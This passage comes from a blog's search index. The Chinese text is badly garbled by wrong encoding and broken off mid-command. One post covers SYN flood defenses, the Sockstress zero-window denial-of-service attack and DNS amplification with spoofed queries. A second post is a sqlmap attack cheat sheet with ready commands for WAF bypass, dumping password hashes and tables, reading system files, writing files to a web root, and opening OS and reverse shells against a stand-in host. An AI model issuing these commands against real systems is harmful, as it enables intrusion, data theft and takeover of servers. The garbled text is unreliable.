Cookieä¹‹åï¼ŒæœåŠ¡å™¨ä¸å†åˆ†é…å­˜å‚¨ç©ºé—´ï¼Œè€Œä¸”é€šè¿‡åŸºäºæ—¶é—´ç§å­çš„éšæœºæ•°ç®—æ³•è®¾ç½®ä¸€ä¸ªSYNå·ï¼Œæ›¿ä»£å®Œå…¨éšæœºçš„SYNå·ã€‚å‘é€å®ŒSYN+ACKç¡®è®¤æŠ¥æ–‡ä¹‹åï¼Œæ¸…ç©ºèµ„æºä¸ä¿å­˜ä»»ä½•çŠ¶æ€ä¿¡æ¯ã€‚ç›´åˆ°æœåŠ¡å™¨æ¥åˆ°å®¢æˆ·ç«¯çš„æœ€ç»ˆACKåŒ…ï¼Œé€šè¿‡Cookieæ£€éªŒç®—æ³•é‰´å®šæ˜¯å¦ä¸å‘å‡ºå»çš„SYN+ACKæŠ¥æ–‡åºåˆ—å·åŒ¹é…ï¼ŒåŒ¹é…åˆ™é€šè¿‡å®Œæˆæ¡æ‰‹ï¼Œå¤±è´¥åˆ™ä¸¢å¼ƒã€‚å½“ç„¶ï¼Œå‰æ–‡çš„é«˜çº§æ”»å‡»ä¸­æœ‰SYNæ··åˆACKçš„æ”»å‡»æ–¹æ³•ï¼Œåˆ™æ˜¯å¯¹æ­¤ç§é˜²å¾¡æ–¹æ³•çš„åå‡»ï¼Œå…¶ä¸­ä¼˜åŠ£ç”±åŒæ–¹çš„ç¡¬ä»¶é…ç½®å†³å®š tcp_max_syn_backlogåˆ™æ˜¯ä½¿ç”¨æœåŠ¡å™¨çš„å†…å­˜èµ„æºï¼Œæ¢å–æ›´å¤§çš„ç­‰å¾…é˜Ÿåˆ—é•¿åº¦ï¼Œè®©æ”»å‡»æ•°æ®åŒ…ä¸è‡³äºå æ»¡æ‰€æœ‰è¿æ¥è€Œå¯¼è‡´æ­£å¸¸ç”¨æˆ·æ— æ³•å®Œæˆæ¡æ‰‹ã€‚net.ipv4.tcp_synack_retriesæ˜¯é™ä½æœåŠ¡å™¨SYN+ACKæŠ¥æ–‡é‡è¯•æ¬¡æ•°ï¼Œå°½å¿«é‡Šæ”¾ç­‰å¾…èµ„æºã€‚è¿™ä¸‰ç§æªæ–½ä¸æ”»å‡»çš„ä¸‰ç§å±å®³ä¸€ä¸€å¯¹åº”ï¼Œå®Œå®Œå…¨å…¨åœ°å¯¹ç—‡ä¸‹è¯ã€‚ä½†è¿™äº›æªæ–½ä¹Ÿæ˜¯åŒåˆƒå‰‘ï¼Œå¯èƒ½æ¶ˆè€—æœåŠ¡å™¨æ›´å¤šçš„å†…å­˜èµ„æºï¼Œç”šè‡³å½±å“æ­£å¸¸ç”¨æˆ·å»ºç«‹TCPè¿æ¥ï¼Œéœ€è¦è¯„ä¼°æœåŠ¡å™¨ç¡¬ä»¶èµ„æºå’Œæ”»å‡»å¤§å°è°¨æ…è®¾ç½®ã€‚ é™¤äº†å®šåˆ¶TCP/IPåè®®æ ˆä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§å¸¸è§åšæ³•æ˜¯TCPé¦–åŒ…ä¸¢å¼ƒæ–¹æ¡ˆï¼Œåˆ©ç”¨TCPåè®®çš„é‡ä¼ æœºåˆ¶è¯†åˆ«æ­£å¸¸ç”¨æˆ·å’Œæ”»å‡»æŠ¥æ–‡ã€‚å½“é˜²å¾¡è®¾å¤‡æ¥åˆ°ä¸€ä¸ªIPåœ°å€çš„SYNæŠ¥æ–‡åï¼Œç®€å•æ¯”å¯¹è¯¥IPæ˜¯å¦å­˜åœ¨äºç™½åå•ä¸­ï¼Œå­˜åœ¨åˆ™è½¬å‘åˆ°åç«¯ã€‚å¦‚ä¸å­˜åœ¨äºç™½åå•ä¸­ï¼Œæ£€æŸ¥æ˜¯å¦æ˜¯è¯¥IPåœ¨ä¸€å®šæ—¶é—´æ®µå†…çš„é¦–æ¬¡SYNæŠ¥æ–‡ï¼Œä¸æ˜¯åˆ™æ£€æŸ¥æ˜¯å¦é‡ä¼ æŠ¥æ–‡ï¼Œæ˜¯é‡ä¼ åˆ™è½¬å‘å¹¶åŠ å…¥ç™½åå•ï¼Œä¸æ˜¯åˆ™ä¸¢å¼ƒå¹¶åŠ å…¥é»‘åå•ã€‚æ˜¯é¦–æ¬¡SYNæŠ¥æ–‡åˆ™ä¸¢å¼ƒå¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´ä»¥è¯•å›¾æ¥å—è¯¥IPçš„SYNé‡ä¼ æŠ¥æ–‡ï¼Œç­‰å¾…è¶…æ—¶åˆ™åˆ¤å®šä¸ºæ”»å‡»æŠ¥æ–‡åŠ å…¥é»‘åå•ã€‚ é¦–åŒ…ä¸¢å¼ƒæ–¹æ¡ˆå¯¹ç”¨æˆ·ä½“éªŒä¼šç•¥æœ‰å½±å“ï¼Œå› ä¸ºä¸¢å¼ƒé¦–åŒ…é‡ä¼ ä¼šå¢å¤§ä¸šåŠ¡çš„å“åº”æ—¶é—´ï¼Œæœ‰é‰´äºæ­¤å‘å±•å‡ºäº†ä¸€ç§æ›´ä¼˜çš„TCP Proxyæ–¹æ¡ˆã€‚æ‰€æœ‰çš„SYNæ•°æ®æŠ¥æ–‡ç”±æ¸…æ´—è®¾å¤‡æ¥å—ï¼ŒæŒ‰ç…§SYN Cookieæ–¹æ¡ˆå¤„ç†ã€‚å’Œè®¾å¤‡æˆåŠŸå»ºç«‹äº†TCPä¸‰æ¬¡æ¡æ‰‹çš„IPåœ°å€è¢«åˆ¤å®šä¸ºåˆæ³•ç”¨æˆ·åŠ å…¥ç™½åå•ï¼Œç”±è®¾å¤‡ä¼ªè£…çœŸå®å®¢æˆ·ç«¯IPåœ°å€å†ä¸çœŸå®æœåŠ¡å™¨å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œéšåè½¬å‘æ•°æ®ã€‚è€ŒæŒ‡å®šæ—¶é—´å†…æ²¡æœ‰å’Œè®¾å¤‡å®Œæˆä¸‰æ¬¡æ¡æ‰‹çš„IPåœ°å€ï¼Œè¢«åˆ¤å®šä¸ºæ¶æ„IPåœ°å€å±è”½ä¸€å®šæ—¶é—´ã€‚é™¤äº†SYN Cookieç»“åˆTCP Proxyå¤–ï¼Œæ¸…æ´—è®¾å¤‡è¿˜å…·å¤‡å¤šç§ç•¸å½¢TCPæ ‡å¿—ä½æ•°æ®åŒ…æ¢æµ‹çš„èƒ½åŠ›ï¼Œé€šè¿‡å¯¹SYNæŠ¥æ–‡è¿”å›éé¢„æœŸåº”ç­”æµ‹è¯•å®¢æˆ·ç«¯ååº”çš„æ–¹å¼æ¥é‰´åˆ«æ­£å¸¸è®¿é—®å’Œæ¶æ„è¡Œä¸ºã€‚ æ¸…æ´—è®¾å¤‡çš„ç¡¬ä»¶å…·æœ‰ç‰¹æ®Šçš„ç½‘ç»œå¤„ç†å™¨èŠ¯ç‰‡å’Œç‰¹åˆ«ä¼˜åŒ–çš„æ“ä½œç³»ç»Ÿã€TCP/IPåè®®æ ˆï¼Œå¯ä»¥å¤„ç†éå¸¸å·¨å¤§çš„æµé‡å’ŒSYNé˜Ÿåˆ—ã€‚ Sockstressç›¸åº”åŸç†ï¼šæ”¾å¤§æ”»å‡»åŸç†ï¼šæ”»å‡»è€…å‘ç›®æ ‡å‘é€ä¸€ä¸ªå¾ˆå°çš„æµé‡ï¼Œä½†æ˜¯ä¼šé€ æˆäº§ç”Ÿçš„æ”»å‡»æµé‡æ˜¯ä¸€ä¸ªå·¨å¤§çš„ã€æˆç™¾ä¸Šåƒå€ä¸Šä¸‡å€æµé‡è¢«æ”¾å¤§çš„ä¸€ä¸ªæ•ˆæœï¼Œæ‰é€‚åˆä½œä¸ºä¸€ä¸ªæ‹’ç»æœåŠ¡æ”»å‡»æ•ˆæœã€‚ï¼ˆå®ç°æ”»å‡»è€…å¾ˆå°çš„æµé‡æ‰“å®ä¸€ä¸ªçœ‹ä¼¼å¾ˆå¤§çš„è¢«æ”»å‡»è€…ï¼‰ å¯¹äºä¸»é¢˜Sockstressä¸»è¦ä½œç”¨å³ï¼šå»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯ä¸ä¼ æ•°æ®ï¼Œè€Œä¸”è¿™ä¸ªè¿æ¥ä¸ä¼šæ–­å¼€ï¼Œå ç”¨èµ„æºï¼Œæœ€åå¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”Sockstressæ˜¯2008å¹´ç”±Jack C. Louiså‘ç°çš„ï¼Œå…¶ä¸»è¦é’ˆå¯¹TCPæœåŠ¡çš„æ‹’ç»æœåŠ¡æ”»å‡»ç›®çš„åœ¨äºï¼šæ¶ˆè€—è¢«æ”»å‡»ç›®æ ‡ç³»ç»Ÿèµ„æºï¼Œä½†ä¸æ¶ˆè€—ç½‘ç»œå¸¦å®½èµ„æºï¼Œä¼šäº§ç”Ÿå¤§é‡TCPè¿æ¥ä½†ä¸ä¼šäº§ç”Ÿå¤§é‡æµé‡ï¼›åœ¨ä¸æ”»å‡»ç›®æ ‡å»ºç«‹å¤§é‡socketé“¾æ¥ï¼›å½“å®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€æœ€åçš„ACKåŒ…windowå¤§å°ä¸º0ï¼ˆå®¢æˆ·ç«¯ä¸æ¥æ”¶æ•°æ®ï¼‰ï¼ˆå†å›æ•°æ®çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯éƒ½ä¼šå„è‡ªç›¸å¯¹æ–¹ç¡®è®¤è‡ªå·±çš„ç©ºé—´å¤§å°ï¼Œé˜²æ­¢åŒæ–¹å„è‡ªä¼ é€å†…å®¹è¿‡å¤§ï¼Œä¸»è¦æ˜¯æµæ§çš„ä½œç”¨ï¼‰ å¯¹äºæ”»å‡»è€…çš„ä¼˜åŠ¿ï¼š 1ã€æ”»å‡»è€…èµ„æºæ¶ˆè€—å°ï¼ˆCPUã€å†…å­˜ã€å®½å¸¦ï¼‰2ã€å¼‚æ­¥æ”»å‡»ï¼Œå•æœºå¯æ‹’ç»æœåŠ¡é«˜é…èµ„æºæœåŠ¡å™¨ ä¸»è¦æœºç†åœ¨äºï¼šwindowçª—å£å®ç°çš„TCPæµæ§ï¼ˆåœ¨ç¬¬ä¸‰æ¬¡ä¼ é€ACKåŒ…çš„æ—¶å€™å‡ºç°ï¼‰ï¼šåˆ©ç”¨æµæ§çš„æ”»å‡»ç‰¹æ€§ï¼Œé€ æˆæ”»å‡»ï¼šæ”»å‡»è€…å°†ACKåŒ…ä¸­çš„æµæ§å¤§å°ä¿®æ”¹ä¸º0ï¼Œç„¶åä¿ƒä½¿ACKä¸åœå‘å‘æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆæ‹’ç»æœåŠ¡ã€‚åœ¨æœåŠ¡å™¨çœ‹æ¥å°±æ˜¯å®¢æˆ·ç«¯æš‚æ—¶æ²¡æœ‰ç©ºé—´æ¥æ¥å—æ•°æ®æµé‡ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€ï¼›ä½†æ˜¯æ”»å‡»è€…åªéœ€è¦å‘å®ŒACKåŒ…å°±è¡Œï¼Œä¸éœ€è¦ç»´æŒè¿™ä¹ˆä¸€ä¸ªè¿æ¥ï¼Œæ‰€ä»¥å¯¹äºæ”»å‡»è€…å°±ä¸ä¼šæ¶ˆè€—å·¨é‡çš„CPUå†…å­˜ã€å¸¦å®½èµ„æº(ä»¥å°æå¤§ï¼Œæ”¾å¤§)ã€‚ Sockstressé˜²èŒƒ é˜²å¾¡æªæ–½-ç›´åˆ°ä»Šå¤©sockstressæ”»å‡»ä»ç„¶æ˜¯ä¸€ç§å¾ˆæœ‰æ•ˆçš„DoSæ”»å‡»æ–¹å¼ -ç”¶äºå»ºç«‹å®Œæ•´çš„TCPä¸‰æ­¥æ¡æ‰‹ï¼Œå› æ­¤ä½¿ç”¨syn cookieé˜²å¾¡æ— æ•ˆ -æ ¹æœ¬çš„é˜²å¾¡æ–¹æ³•æ˜¯é‡‡ç”¨ç™½åå•ï¼ˆä¸å®é™…ï¼‰-æŠ˜ä¸­å¯¹ç­–ï¼šé™åˆ¶å•ä½æ—¶é—´å†…æ¯IPå»ºçš„TCPè¿æ¥æ•°â– å°æ€æ¯30ç§’ä¸80ç«¯å£å»ºç«‹è¿æ¥è¶…è¿‡10ä¸ªçš„IPåœ°å€â– iptables -I INPUT -p tcp â€“dport 80 -m state â€“state NEW -m recent â€“setâ–  iptables -I INPUT -p tcp â€“dport 80 -m state â€“state NEW -m recent â€“update -Â¬seconds 30 â€“hitcount 10 -j DROPâ– ä»¥ä¸Šè§„åˆ™å¯¹DDoSæ”»å‡»æ— æ•ˆ DNSæ”¾å¤§æ”»å‡»123456789101112â– äº§ç”Ÿå¤§æµé‡çš„æ”»å‡»æ–¹æ³•-å•æœºçš„å¸¦å®½ä¼˜åŠ¿ -å·¨å¤§å•æœºæ•°é‡å½¢æˆçš„æµé‡æ±‡èš-åˆ©ç”¨åè®®ç‰¹æ€§å®ç°æ”¾å¤§æ•ˆæœçš„æµé‡â–  DNSåè®®æ”¾å¤§æ•ˆæœ-æŸ¥è¯¢è¯·æ±‚æµé‡å°ï¼Œä½†å“åº”æµé‡å¯èƒ½éå¸¸å·¨å¤§-digANYhp.com @202.106.0.20 (æµé‡æ”¾å¤§çº¦8å€ï¼‰â– æ”»å‡»åŸç†-ä¼ªé€ æºåœ°å€ä¸ºè¢«æ”»å‡»ç›®æ ‡åœ°å€ï¼Œå‘é€’å½’åŸŸåæŸ¥è¯¢æœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ -DNSæœåŠ¡å™¨æˆä¸ºæµé‡æ”¾å¤§å’Œå®æ–½æ”»å‡»è€…ï¼Œå¤§é‡DNSæœåŠ¡å™¨å®ç°DDoS Scapyæ„é€ æ”»å‡»æ•°æ®åŒ…IP/UDP/DNS/DNSæŸ¥è¯¢å†…å®¹ image.png ç»“åˆIPåœ°å€æ¬ºéª—ï¼Œåˆ©ç”¨å¤§é‡DNSæœåŠ¡å™¨åšå‚€å„¡æ”»å‡»ç›®æ ‡","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"sqlmapä½¿ç”¨","slug":"sqlmapä½¿ç”¨","date":"2020-03-09T14:41:50.000Z","updated":"2020-09-20T09:03:01.559Z","comments":true,"path":"2020/03/09/sqlmapä½¿ç”¨/","link":"","permalink":"https://zhangyanlady.github.io/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667cookieæ³¨å…¥ï¼šsqlmap.py -u æ³¨å…¥ç‚¹ --cookie &quot;å‚æ•°&quot; --tables --level 2POSTç™»å½•æ¡†æ³¨å…¥ï¼šsqlmap.py -r ä»æ–‡ä»¶è¯»å–æ•°æ® -p æŒ‡å®šçš„å‚æ•° --tablessqlmap.py -u ç™»å½•çš„åœ°å€ --forms è‡ªåŠ¨åˆ¤æ–­æ³¨å…¥sqlmap.py -u ç™»å½•çš„åœ°å€ --data &quot;æŒ‡å®šå‚æ•°&quot;ç»•è¿‡wafé˜²ç«å¢™ï¼šsqlmap.py -u æ³¨å…¥ç‚¹ -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py-u #æ³¨å…¥ç‚¹-g è°·æ­Œæœç´¢-f #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹-b #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯-p #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page&#x3D;1&amp;id&#x3D;2 -p â€œpage,idâ€)-Dâ€œâ€ #æŒ‡å®šæ•°æ®åº“å-Tâ€œâ€ #æŒ‡å®šè¡¨å-C â€œâ€ #æŒ‡å®šå­—æ®µ-s â€œâ€ #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s â€œxx.logâ€ æ¢å¤:-s â€œxx.logâ€ â€“resume)â€“columns #åˆ—å‡ºå­—æ®µâ€“current-user #è·å–å½“å‰ç”¨æˆ·åç§°â€“current-db #è·å–å½“å‰æ•°æ®åº“åç§°â€“users #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·â€“passwords #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç â€“privileges #æŸ¥çœ‹ç”¨æˆ·æƒé™(â€“privileges -U root)-U #æŒ‡å®šæ•°æ®åº“ç”¨æˆ·â€“dbs #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“â€“tables -D â€œâ€ #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨â€“columns -T â€œuserâ€ -D â€œmysqlâ€ #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µâ€“dump-all #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨â€“exclude-sysdbs #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨â€“dump -T â€œâ€ -D â€œâ€ -C â€œâ€ #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(â€“dump -T users -D master -C surname)â€“dump -T â€œâ€ -D â€œâ€ â€“start 2 â€“top 4 # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ®â€“dbms #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)â€“os #æŒ‡å®šç³»ç»Ÿ(Linux,Windows)--sql -shell å†™shell--delay å»¶è¿Ÿçš„æ—¶é—´--safe-freq æ¬¡æ•° 123456789101112131415-v #è¯¦ç»†çš„ç­‰çº§(0-6)0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980â€“privileges #æŸ¥çœ‹æƒé™â€“is-dba #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜â€“roles #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰²â€“udf-inject #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰â€“union-check #æ˜¯å¦æ”¯æŒunion æ³¨å…¥â€“union-cols #union æŸ¥è¯¢è¡¨è®°å½•â€“union-test #union è¯­å¥æµ‹è¯•â€“union-use #é‡‡ç”¨union æ³¨å…¥â€“union-tech orderby #unioné…åˆorder byâ€“method â€œPOSTâ€ â€“data â€œâ€ #POSTæ–¹å¼æäº¤æ•°æ®(â€“method â€œPOSTâ€ â€“data â€œpage&#x3D;1&amp;id&#x3D;2â€³)â€“cookie â€œç”¨;å·åˆ†å¼€â€ #cookieæ³¨å…¥(â€“cookies&#x3D;â€PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;lowâ€)â€“referer â€œâ€ #ä½¿ç”¨refereræ¬ºéª—(â€“referer â€œhttp:&#x2F;&#x2F;www.baidu.comâ€)â€“user-agent â€œâ€ #è‡ªå®šä¹‰user-agentâ€“proxy â€œhttp:&#x2F;&#x2F;127.0.0.1:8118â€³ #ä»£ç†æ³¨å…¥â€“string â€œâ€ #æŒ‡å®šå…³é”®è¯â€“threads #é‡‡ç”¨å¤šçº¿ç¨‹(â€“threads 3)â€“sql-shell #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤â€“sql-query #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(â€“sql-query â€œSELECT password FROM mysql.user WHERE user &#x3D; â€˜rootâ€™ LIMIT 0, 1â€³ )â€“file-read #è¯»å–æŒ‡å®šæ–‡ä»¶â€“file-write #å†™å…¥æœ¬åœ°æ–‡ä»¶(â€“file-write &#x2F;test&#x2F;test.txt â€“file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt)â€“file-dest #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„â€“os-cmd&#x3D;id #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤â€“os-shell #ç³»ç»Ÿäº¤äº’shellâ€“os-pwn #åå¼¹shell(â€“os-pwn â€“msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)â€“msf-path&#x3D; #matesploitç»å¯¹è·¯å¾„(â€“msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)â€“os-smbrelay #â€“os-bof #â€“reg-read #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨â€“priv-esc #â€“time-sec&#x3D; #å»¶è¿Ÿè®¾ç½® é»˜è®¤â€“time-sec&#x3D;5 ä¸º5ç§’-p â€œuser-agentâ€ â€“user-agent â€œsqlmap&#x2F;0.7rc1 (http:&#x2F;&#x2F;sqlmap.sourceforge.net)â€ #æŒ‡å®šuser-agentæ³¨å…¥â€“eta #ç›²æ³¨&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;common-columns.txt å­—æ®µå­—å…¸common-outputs.txtcommon-tables.txt è¡¨å­—å…¸keywords.txtoracle-default-passwords.txtuser-agents.txtwordlist.txt 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171)åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯dbapython sqlmap.py -u &quot;url&quot; --is-dba -v 12)--users:åˆ—å‡ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·python sqlmap.py -u &quot;url&quot; --users -v 03)--passwords:æ•°æ®åº“ç”¨æˆ·å¯†ç (hash)python sqlmap.py -u &quot;url&quot; --passwords -v 0python sqlmap.py -u &quot;url&quot; --passwords -U sa -v 04)æŸ¥çœ‹ç”¨æˆ·æƒé™python sqlmap.py -u &quot;url&quot; --privileges -v 0python sqlmap.py -u &quot;url&quot; --privileges -U postgres -v 05)--dbså¯ä»¥åˆ©ç”¨çš„æ•°æ®åº“python sqlmap.py -u &quot;url&quot; --dbs -v 06)--tablesåˆ—æ•°æ®åº“è¡¨python sqlmap.py -u &quot;url&quot; --tables -D &quot;information_scheam&quot;-D:æŒ‡å®šæ•°æ®åç§°7)--columns åˆ—å‡ºè¡¨ä¸­çš„åˆ—åpython sqlmap.py -u &quot;url&quot; --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1-T:æŒ‡å®šè¡¨åï¼Œ-D:æŒ‡å®šåº“å8)--dumpåˆ—è¡¨ä¸­æŒ‡å®šåˆ—çš„å†…å®¹python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot;-C:å¯ä»¥æŒ‡å®šå­—æ®µæŒ‡å®šåˆ—çš„èŒƒå›´ä¸º2åˆ°4python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 09)--dumap-allåˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼Œæ‰€æœ‰è¡¨å†…å®¹python sqlmap.py -u &quot;url&quot; --dump-all -v 0åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨çš„å†…å®¹python sqlmap.py -u &quot;url&quot; --dump-all --exclude-sysdbs -v 010)--fileè¯»å–æ–‡ä»¶å†…å®¹[load_file()å‡½æ•°]python sqlmap.py -u &quot;url&quot; --file &#x2F;etc&#x2F;password11)æ‰§è¡ŒSQLpython sqlmap.py -u &quot;url&quot; --sql-shell12)-p æŒ‡å®šå‚æ•°python sqlmap.py -u &quot;url&quot; -v 1 -p &quot;id&quot;-på¯ä»¥æŒ‡å®šå¤šå‚æ•°-p &quot;cat,id&quot;13)POSTæäº¤python sqlmap.py -u &quot;url&quot; --method POST --data &quot;id&#x3D;1&quot;14)COOKIEæäº¤python sqlmap.py -u &quot;url&quot; --cookie &quot;id&#x3D;1&quot; -v 1cookieå€¼å¯ä»¥ç”±TamperDataæŠ“å–15)referæ¬ºéª—python sqlmap.py -u &quot;url&quot; --refer &quot;url&quot; -v 316)ä½¿ç”¨è‡ªå®šä¹‰user-agentæˆ–è€…user-agents.txtpython sqlmap.py -u &quot;url&quot; --user-agent &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; -v 3python sqlmap.py -u &quot;url&quot; -v 1 -a &quot;.&#x2F;txt&#x2F;user-agents.txt&quot;17)ä½¿ç”¨å¤šçº¿ç¨‹çŒœè§£python sqlmap.py -u &quot;url&quot; -v 1 --current-user --threads 318)æŒ‡å®šæ•°æ®åº“ï¼Œç»•è¿‡SQLMAPçš„è‡ªåŠ¨æ£€æµ‹python sqlmap.py -u &quot;url&quot; -v 2 --dbms &quot;PostgreSQL&quot;19)æŒ‡å®šæ“ä½œç³»ç»Ÿç»•è¿‡SQLMAPè‡ªåŠ¨æ£€æµ‹python sqlmap.py -u &quot;url&quot; -v 2 --os &quot;Windows&quot;20)--prefix and --postfixè‡ªå®šä¹‰payloadpython sqlmap.py -u &quot;url&quot; -v 3 -p &quot;id&quot; --prefix &quot;&#39;&quot; --postfix &quot;and &#39;test&#39;&#x3D;&#39;test&quot;21)unionæ³¨å…¥æµ‹è¯•python sqlmap.py -u &quot;url&quot; --union-test -v -122)é…åˆorder bypython sqlmap.py -u &quot;url&quot; --union-test --union-tech orderby -v 123)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --banner24)python sqlmap.py -u &quot;url&quot; -v 5 --union-use --current-user25)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --dbs å¸¸ç”¨è¯­å¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778791..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b â€“current-user â€“current-db â€“users â€“passwords â€“dbs -v 02..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“passwords -U root â€“union-use -v 23..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“dump -T users -C username -D userdb â€“start 2 â€“stop 3 -v 24..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“dump -C â€œuser,passâ€ -v 1 â€“exclude-sysdbs5..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“sql-shell -v 26..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“file-read â€œc:\\boot.iniâ€ -v 27..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“file-write &#x2F;test&#x2F;test.txt â€“file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt -v 28..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“os-cmd â€œidâ€ -v 19..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“os-shell â€“union-use -v 210..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“os-pwn â€“msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 â€“priv-esc -v 111..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; 